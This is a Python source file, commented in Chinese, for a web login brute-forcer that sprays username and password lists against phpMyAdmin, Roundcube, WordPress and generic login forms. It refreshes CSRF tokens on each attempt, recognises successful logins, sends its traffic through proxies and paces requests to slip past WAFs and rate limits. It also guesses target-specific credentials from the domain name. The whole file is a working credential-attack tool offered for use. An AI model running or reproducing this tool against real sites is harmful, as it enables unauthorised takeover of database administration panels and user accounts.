"""
Web 登录爆破器 — 对 phpMyAdmin 等 CSRF 保护的登录表单做密码喷射.

核心流程:
    1. detect_login_form(): 自动检测登录页表单字段, 确定 action URL + CSRF token 字段
    2. crack(): 对每个用户名×密码组合:
        a. GET 登录页 → 提取 CSRF token
        b. POST 用户名+密码+token → 检查成功标志
        c. 自适应延迟, 避免触发 WAF
    3. 全部走代理 (Session 已配好)

复用:
    - injector.py 的 CSRF token 提取模式
    - ProxyManager 的代理保障
    - Payloads 库 (必要时可组合 SQLi bypass)
"""

import re
import time
import logging
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)


# ============================================================
# 成功判定标志
# ============================================================

# phpMyAdmin 登录成功 → 跳转到 index.php?route=/
# 失败 → 重新渲染登录页, 有 #input_username 和错误消息
PMA_SUCCESS_PATTERNS = [
    r"location\.href\s*=\s*['\"]index\.php",
    r"window\.location\s*=\s*['\"].*route=",
    r"<a\s+href=\"index\.php",
    r"class=['\"]?navbar['\"]?",
    r"id=\"serverinfo\"",      # phpMyAdmin 顶部服务器信息栏
    r"navigation.php",         # 导航框架
    r"pmadb\.navigation",      # phpMyAdmin 导航
]

# 通用成功标志
GENERIC_SUCCESS_PATTERNS = [
    r"dashboard",
    r"logout",
    r"welcome",
    r"my_account",
    r"profile",
    r"redirect",
]

# 被拦截/锁定的标志
BLOCKED_PATTERNS = [
    r"too many attempts",
    r"too many login",
    r"rate limit",
    r"captcha",
    r"blocked",
    r"locked",
    r"suspended",
    r"429",
    r"please try again later",
    r"recaptcha",
    r"hCaptcha",
]


@dataclass
class LoginFormInfo:
    """检测到的登录表单信息."""
    action_url: str = ""
    method: str = "POST"
    username_field: str = "username"
    password_field: str = "password"
    token_fields: List[str] = field(default_factory=list)
    session_cookie: str = ""
    is_phpmyadmin: bool = False
    is_roundcube: bool = False
    is_wordpress: bool = False
    form_type: str = "generic"  # "phpmyadmin" | "roundcube" | "wordpress" | "generic"
    _html_cache: str = ""  # 页面 HTML 缓存, agent 复用

    @property
    def has_csrf(self) -> bool:
        return len(self.token_fields) > 0


@dataclass
class BruteResult:
    """一次登录尝试的结果."""
    url: str = ""
    username: str = ""
    password: str = ""
    success: bool = False
    status_code: int = 0
    blocked: bool = False
    response_length: int = 0
    time_ms: float = 0.0
    detail: str = ""


@dataclass
class BruteReport:
    """完整爆破报告."""
    url: str = ""
    total_attempts: int = 0
    successful: List[BruteResult] = field(default_factory=list)
    blocked: bool = False
    total_time_sec: float = 0.0
    error: str = ""


# ============================================================
# CSRF token 提取 (参考 injector.py 的模式)
# ============================================================

CSRF_TOKEN_NAMES = [
    'token', 'csrf', 'csrf_token', 'csrf-token', '_token',
    'nonce', '_wpnonce', 'authenticity_token',
    'xsrf', '_csrf', 'csrfmiddlewaretoken',
    'set_session', 'server',  # phpMyAdmin
    '__RequestVerificationToken',  # ASP.NET
    'form_token', 'formtoken', 'sectoken',
]

CSRF_VALUE_PATTERNS = [
    r'name="token"\s+value="([^"]+)"',         # phpMyAdmin
    r'name="set_session"\s+value="([^"]+)"',    # phpMyAdmin
    r'name="([^"]*csrf[^"]*)"\s+value="([^"]+)"',
    r'name="([^"]*token[^"]*)"\s+value="([^"]+)"',
    r'name="([^"]*nonce[^"]*)"\s+value="([^"]+)"',
    r'<meta\s+name="csrf[^"]*"\s+content="([^"]+)"',
    r'name="__RequestVerificationToken"\s+.*?value="([^"]+)"',
]


def extract_csrf_tokens(html: str) -> Dict[str, str]:
    """从 HTML 页面提取所有 CSRF token 字段. (复用 injector 逻辑)"""
    tokens = {}
    for pat in CSRF_VALUE_PATTERNS:
        for m in re.finditer(pat, html, re.I):
            groups = m.groups()
            if len(groups) == 2:
                tokens[groups[0].lower()] = groups[1]
            elif len(groups) == 1:
                tokens['token'] = groups[0]
    # phpMyAdmin 特殊处理
    if 'phpmyadmin' in html.lower() or 'pma_' in html:
        for field in ['server', 'lang', 'token', 'set_session']:
            m = re.search(rf'name="{field}"\s+value="([^"]+)"', html, re.I)
            if m and field not in tokens:
                tokens[field] = m.group(1)
    # hidden input 补抓
    for hidden_m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html, re.I):
        tag = hidden_m.group(0)
        name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        value_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if name_m and value_m:
            name = name_m.group(1).lower()
            if any(kw in name for kw in CSRF_TOKEN_NAMES) and name not in tokens:
                tokens[name] = value_m.group(1)
    return tokens


class WebLoginBruteForcer:
    """
    Web 登录爆破器.

    用法:
        import requests
        s = requests.Session()
        s.proxies = {'http': 'socks5h://127.0.0.1:7890', ...}

        brute = WebLoginBruteForcer(s)
        form = brute.detect_login_form("https://target.com/phpmyadmin/")
        report = brute.crack("https://target.com/phpmyadmin/",
                             usernames=["admin","root"],
                             passwords=["admin123","root123"])
    """

    def __init__(self, session, timeout: float = 10.0, delay: float = 1.0,
                 max_retries: int = 2):
        """
        Args:
            session: 已配好代理的 requests.Session
            timeout: 单请求超时
            delay: 请求间基础延迟 (秒)
            max_retries: CSRF 获取失败时重试次数
        """
        self.session = session
        self.timeout = timeout
        self.delay = delay
        self.max_retries = max_retries
        self._last_delay = delay

    # ============================================================
    # 表单检测
    # ============================================================

    def detect_login_form(self, url: str) -> LoginFormInfo:
        """
        自动检测目标 URL 的登录表单.

        GET 页面 → 解析表单字段 → 返回 LoginFormInfo.
        支持 phpMyAdmin / Roundcube / WordPress / 通用登录页.
        """
        info = LoginFormInfo(action_url=url)

        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            html = resp.text
            info._html_cache = html  # 缓存 HTML 供 agent 复用
            info.session_cookie = "; ".join(
                f"{k}={v}" for k, v in self.session.cookies.get_dict().items()
            )

            # 判断是否为 phpMyAdmin
            info.is_phpmyadmin = 'phpmyadmin' in html.lower() or 'pma_' in html \
                or 'pma_password' in html or 'input_username' in html

            # 判断是否为 Roundcube (_user/_pass + _task/_action)
            if not info.is_phpmyadmin:
                info.is_roundcube = ('_user' in html and '_pass' in html
                                     and '_task=login' in html)
                # 判断是否为 WordPress (log/pwd 或 wp-login.php)
                if not info.is_roundcube:
                    info.is_wordpress = ('wp-login.php' in url
                                         or 'name="log"' in html
                                         or 'name="pwd"' in html
                                         or 'wp-submit' in html)

            # 设置 form_type
            if info.is_phpmyadmin:
                info.form_type = "phpmyadmin"
            elif info.is_roundcube:
                info.form_type = "roundcube"
            elif info.is_wordpress:
                info.form_type = "wordpress"

            # 提取 CSRF token
            tokens = extract_csrf_tokens(html)
            info.token_fields = list(tokens.keys())

            # 找表单字段
            if info.is_phpmyadmin:
                info.username_field = 'pma_username'
                info.password_field = 'pma_password'
                if 'input_username' in html:
                    info.username_field = 'input_username'
                    info.password_field = 'input_password'
                form_m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.I)
                if form_m:
                    info.action_url = urljoin(url, form_m.group(1))
                else:
                    info.action_url = url
            elif info.is_roundcube:
                info.username_field = '_user'
                info.password_field = '_pass'
                info.action_url = url.rstrip('/') + '/?_task=login'
            elif info.is_wordpress:
                info.username_field = 'log'
                info.password_field = 'pwd'
                form_m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.I)
                if form_m:
                    info.action_url = urljoin(url, form_m.group(1))
                else:
                    info.action_url = url
            else:
                # 通用表单检测
                form_m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.I)
                if form_m:
                    info.action_url = urljoin(url, form_m.group(1))
                input_m = re.findall(r'<input[^>]*type=["\']?(?:text|email|password)["\']?[^>]*>', html, re.I)
                for inp in input_m:
                    name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                    if not name_m:
                        continue
                    field_name = name_m.group(1)
                    if 'password' in inp.lower() or 'pass' in field_name.lower():
                        info.password_field = field_name
                    elif 'user' in field_name.lower() or 'email' in field_name.lower() \
                            or 'login' in field_name.lower() or 'log' in field_name.lower():
                        info.username_field = field_name

        except Exception as e:
            logger.warning(f"detect_login_form failed for {url}: {e}")
            info.action_url = url

        return info

    # ============================================================
    # CSRF token 获取 (每轮)
    # ============================================================

    def _get_csrf_tokens(self, url: str, form_info: LoginFormInfo) -> Dict[str, str]:
        """GET 登录页提取 CSRF token (每次登录尝试前调用)."""
        for attempt in range(self.max_retries + 1):
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                tokens = extract_csrf_tokens(resp.text)

                # phpMyAdmin 特殊: token 值可能变化, 但 set_session 和 server 不变
                # 确保至少有一些 token
                if tokens:
                    return tokens
            except Exception as e:
                logger.debug(f"CSRF fetch attempt {attempt + 1} failed: {e}")
                if attempt < self.max_retries:
                    time.sleep(0.5)
        return {}

    # ============================================================
    # 成功判定
    # ============================================================

    @staticmethod
    def _is_login_success(resp, form_info: LoginFormInfo) -> Tuple[bool, str]:
        """
        判定登录是否成功.
        Returns: (success, detail)
        """
        body = resp.text
        url_lower = resp.url.lower()
        status = resp.status_code

        # 1. 状态码: 302 到 dashboard/admin → 成功
        if status in (301, 302, 303, 307, 308):
            redirect_to = resp.headers.get("Location", "")
            if redirect_to:
                if any(kw in redirect_to.lower() for kw in
                       ["index.php", "route=", "dashboard", "admin", "home", "main"]):
                    return True, f"redirect to {redirect_to}"

        # 2. phpMyAdmin 特有成功标志
        if form_info.is_phpmyadmin:
            for pat in PMA_SUCCESS_PATTERNS:
                if re.search(pat, body, re.I):
                    return True, f"phpMyAdmin success pattern: {pat}"
            # phpMyAdmin 登录失败: 返回 200, 有 #input_username, 有错误消息
            if "input_username" in body and "Cannot log in" in body:
                return False, "phpMyAdmin login failed (wrong credentials)"
            if "input_username" in body and "Access denied" in body:
                return False, "phpMyAdmin login failed (access denied)"

        # 3. 响应包含了登录表单本身 → 几乎肯定是失败
        if form_info.is_phpmyadmin and "input_username" in body:
            return False, "login form still displayed"

        # 4. 通用成功: 响应中有 dashboard/logout/welcome 且原始登录表单不在
        if status == 200:
            for pat in GENERIC_SUCCESS_PATTERNS:
                if re.search(pat, body, re.I):
                    # 检查是否仍然包含登录表单 (双重确认)
                    if not re.search(r'type=["\']?password["\']?', body, re.I):
                        return True, f"generic success: {pat}"

        # 5. 特殊: 登录失败返回 200 但内容变短 (某些系统)
        # 这个需要 baseline 对比, 不在单次判定中处理

        return False, f"status={status}, no success pattern"

    @staticmethod
    def _is_blocked(resp, form_info: LoginFormInfo = None) -> Tuple[bool, str]:
        """
        判定是否被拦截/限速.
        
        Args:
            resp: HTTP 响应
            form_info: 登录表单信息 (用于区分不同系统的正常状态码)
            
        注意:
            - Roundcube 登录失败返回 401 → 这不是拦截, 是正常失败
            - WordPress 登录失败返回 200 + ERROR → 不是拦截
            - 只有 429/503/403 才真是拦截
        """
        body = resp.text.lower()
        status = resp.status_code
        
        # Roundcube: 401 是正常认证失败, 不是拦截
        if form_info and form_info.is_roundcube and status == 401:
            return False, ""
        # WordPress: 200 是正常失败 (登录页重新渲染)
        if form_info and form_info.is_wordpress and status == 200:
            return False, ""
        
        if status == 429:
            return True, "HTTP 429 Too Many Requests"
        if status == 503:
            return True, "HTTP 503 Service Unavailable (可能限速)"
        if status == 403:
            return True, "HTTP 403 Forbidden"
        for pat in BLOCKED_PATTERNS:
            if re.search(pat, body, re.I):
                return True, f"blocked pattern: {pat}"
        return False, ""

    # ============================================================
    # 自适应延迟
    # ============================================================

    def _adaptive_delay(self, blocked: bool):
        """根据是否被拦截调整延迟."""
        if blocked:
            self._last_delay = min(self._last_delay * 2, 30.0)  # 最多 30s
            logger.warning(f"Blocked! Increasing delay to {self._last_delay:.1f}s")
        else:
            # 每 5 次成功尝试后逐步恢复
            self._last_delay = max(self._last_delay * 0.9, self.delay)

        time.sleep(self._last_delay)

    # ============================================================
    # 核心: 爆破入口
    # ============================================================

    def crack(self, url: str, usernames: List[str], passwords: List[str],
              form_info: Optional[LoginFormInfo] = None,
              max_attempts: int = 200, stop_on_first: bool = True) -> BruteReport:
        """
        执行密码喷射.

        Args:
            url: 登录页 URL
            usernames: 用户名字典
            passwords: 密码字典
            form_info: 可选, 如果已检测过登录表单
            max_attempts: 最大尝试次数
            stop_on_first: 找到第一个有效密码后是否停止

        Returns:
            BruteReport
        """
        report = BruteReport(url=url)
        start_time = time.time()

        # 1. 检测登录表单
        if form_info is None:
            form_info = self.detect_login_form(url)
            logger.info(f"Detected login form: action={form_info.action_url}, "
                        f"token_fields={form_info.token_fields}, "
                        f"is_phpmyadmin={form_info.is_phpmyadmin}")

        # 2. 获取初始 CSRF token
        base_url = form_info.action_url or url
        # phpMyAdmin: 需要从根 URL 获取 token
        token_url = url
        if form_info.is_phpmyadmin:
            token_url = url.rstrip('/') + '/'

        # 3. 主循环
        attempt_count = 0
        global_blocked = False

        for username in usernames:
            if attempt_count >= max_attempts:
                break
            if global_blocked:
                break

            for password in passwords:
                if attempt_count >= max_attempts:
                    break
                if global_blocked:
                    break

                attempt_count += 1
                result = BruteResult(
                    url=base_url,
                    username=username,
                    password=password,
                )

                try:
                    # 3a. 获取 CSRF token (每次刷新)
                    tokens = self._get_csrf_tokens(token_url, form_info)

                    # 3b. 构建 POST 数据
                    post_data = {}
                    if form_info.is_phpmyadmin:
                        post_data[form_info.username_field] = username
                        post_data[form_info.password_field] = password
                        post_data['server'] = tokens.get('server', '1')
                        # phpMyAdmin 用 token 字段而非 cookie
                        pma_token = tokens.get('token', '')
                        if pma_token:
                            post_data['token'] = pma_token
                        # set_session 只需要在第一个请求时提交
                        set_session = tokens.get('set_session', '')
                        if set_session and attempt_count == 1:
                            post_data['set_session'] = set_session
                    else:
                        post_data[form_info.username_field] = username
                        post_data[form_info.password_field] = password
                        # CSRF token (如果有)
                        for field in form_info.token_fields:
                            if field in tokens:
                                post_data[field] = tokens[field]

                    # 3c. 添加 session cookie (如果有)
                    headers = {}
                    if form_info.session_cookie:
                        headers['Cookie'] = form_info.session_cookie

                    # 3d. 发送登录请求
                    t0 = time.time()
                    resp = self.session.post(
                        base_url,
                        data=post_data,
                        headers=headers,
                        timeout=self.timeout,
                        allow_redirects=True,
                    )
                    elapsed = (time.time() - t0) * 1000

                    result.status_code = resp.status_code
                    result.response_length = len(resp.text)
                    result.time_ms = round(elapsed, 1)

                    # 3e. 检查是否被拦截
                    blocked, block_detail = self._is_blocked(resp, form_info)
                    if blocked:
                        result.blocked = True
                        result.detail = block_detail
                        global_blocked = True
                        report.blocked = True
                        self._adaptive_delay(True)
                        logger.warning(f"BLOCKED after {attempt_count} attempts: {block_detail}")
                        break  # 跳出密码循环

                    # 3f. 检查登录是否成功
                    success, detail = self._is_login_success(resp, form_info)
                    result.success = success
                    result.detail = detail

                    if success:
                        report.successful.append(result)
                        logger.info(f"✅ SUCCESS: {username}:{password} -> {detail}")
                        if stop_on_first:
                            report.total_attempts = attempt_count
                            report.total_time_sec = round(time.time() - start_time, 1)
                            return report
                    else:
                        logger.debug(f"  [{attempt_count}] {username}:{password} -> {detail}")

                    # 3g. 自适应延迟
                    self._adaptive_delay(False)

                except Exception as e:
                    result.detail = f"error: {e}"
                    logger.debug(f"  [{attempt_count}] {username}:{password} -> error: {e}")
                    time.sleep(self.delay * 2)

        report.total_attempts = attempt_count
        report.total_time_sec = round(time.time() - start_time, 1)
        return report


# ============================================================
# 快捷函数
# ============================================================

def brute_phpmyadmin(url: str, usernames: Optional[List[str]] = None,
                     passwords: Optional[List[str]] = None,
                     proxy: Optional[Dict[str, str]] = None,
                     max_attempts: int = 200) -> BruteReport:
    """
    针对 phpMyAdmin 登录的快捷爆破函数.

    Args:
        url: phpMyAdmin URL (如 "https://target.com/phpmyadmin/")
        usernames: 用户名列表, 默认 ["admin", "root"]
        passwords: 密码列表, 默认常见弱密码
        proxy: 代理设置, 如 {'http': 'socks5h://127.0.0.1:7890'}
        max_attempts: 最大尝试次数

    Returns:
        BruteReport
    """
    import requests
    from .targeted_dict import TargetedDictGenerator

    session = requests.Session()
    session.verify = False
    if proxy:
        session.proxies = proxy

    if usernames is None:
        # 从域名猜测用户名
        domain = urlparse(url).netloc
        usernames = TargetedDictGenerator.guess_usernames(domain)
        usernames = list(dict.fromkeys(usernames))[:10]  # 去重且限制

    if passwords is None:
        domain = urlparse(url).netloc
        passwords = TargetedDictGenerator.from_domain(domain, top_n=200)

    brute = WebLoginBruteForcer(session)
    form = brute.detect_login_form(url)
    report = brute.crack(url, usernames, passwords,
                         form_info=form, max_attempts=max_attempts)
    session.close()
    return report